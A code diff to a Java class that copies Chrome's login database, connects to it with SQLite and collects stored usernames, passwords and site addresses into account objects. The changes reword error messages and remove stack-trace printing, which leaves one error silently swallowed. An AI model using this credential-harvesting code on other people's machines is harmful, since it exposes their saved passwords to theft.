@@ -30,7 +30,6 @@ public class ChromeDatabase {
 
     public static ChromeDatabase connect(File database)
             throws DatabaseConnectionException {
-
         Path tempDB;
         try {
             tempDB = Files.createTempFile("CHROME_LOGIN_", null);
@@ -40,7 +39,7 @@ public class ChromeDatabase {
             tempDB.toFile().deleteOnExit();
         } catch (IOException e) {
             throw new DatabaseConnectionException(
-                    "Error copying database! Has chrome updated?");
+                    "Error copying database! Does the login file exist?");
         }
         Connection db;
         try {
@@ -51,9 +50,8 @@ public class ChromeDatabase {
             db = config.createConnection("jdbc:sqlite:" + tempDB.toString());
             db.setAutoCommit(true);
         } catch (SQLException e) {
-            // TODO: Better handling of connection
             throw new DatabaseConnectionException(
-                    "Error connecting to database! Has chrome updated?");
+                    "Error connecting to database! Is database corrupted?");
         }
         return new ChromeDatabase(db);
     }
@@ -64,7 +62,7 @@ public class ChromeDatabase {
         try {
             if (connection.isClosed()) {
                 throw new DatabaseConnectionException(
-                        "Connection to database has been terminated.");
+                        "Connection to database has been terminated! Cannot fetch accounts.");
             }
         } catch (SQLException e) {
             throw new DatabaseConnectionException(
@@ -97,16 +95,13 @@ public class ChromeDatabase {
                     }
                     accounts.add(new ChromeAccount(username, password, address));
                 } catch (SQLException e) {
-                    e.printStackTrace();
-                    // TODO: Handle when error adding row from db to list of accounts
                 }
             }
             results.close();
             results.getStatement().close();
         } catch (SQLException e) {
-            e.printStackTrace();
             throw new DatabaseReadException(
-                    "Error reading database. Has chrome updated?");
+                    "Error reading database. Is the file corrupted?");
         }
         return accounts;
     }
